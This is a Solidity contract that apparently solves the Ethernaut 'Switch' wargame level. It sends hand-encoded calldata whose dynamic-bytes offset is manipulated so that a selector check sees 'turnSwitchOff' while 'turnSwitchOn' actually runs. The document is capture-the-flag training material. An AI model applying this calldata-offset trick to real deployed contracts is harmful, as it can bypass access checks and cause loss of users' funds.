// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/**
 * @title 29. SWITCH
 * @dev Just have to flip the switch. Can't be that hard, right?
 */

contract Switcher {
    address private switchContract = 0x71d674183F060C9819002181A2cDBa21520D17c2; // Replace with your Switch instance
    bytes4 public onSelector = bytes4(keccak256("turnSwitchOn()"));
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    function toogle() public {
        // 1. Construct the calldata
        bytes
            memory data = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";

        // 2. Toogle switch
        (bool success, ) = switchContract.call(data);
        require(success, "Toogle failed!");
    }
}
